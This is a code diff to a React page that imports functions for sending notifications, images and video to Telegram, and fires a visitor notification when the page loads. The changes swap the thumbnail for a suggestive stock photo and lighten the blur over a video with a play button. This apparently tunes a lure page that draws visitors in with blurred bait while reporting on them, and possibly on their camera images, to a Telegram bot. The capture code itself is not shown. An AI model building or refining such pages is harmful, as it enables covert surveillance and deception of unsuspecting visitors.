@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
+  const thumbnailUrl = 'https://st4.depositphotos.com/3315095/21045/i/450/depositphotos_210451064-stock-photo-portrait-sexy-young-woman-model.jpg';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
@@ -156,7 +156,7 @@ function App() {
           <div className="relative">
             <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
               {isBlurred && (
-                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
+                <div className="absolute inset-0 backdrop-blur-sm bg-black/50" />
               )}
               <div className="absolute inset-0 flex items-center justify-center z-10">
                 <button 
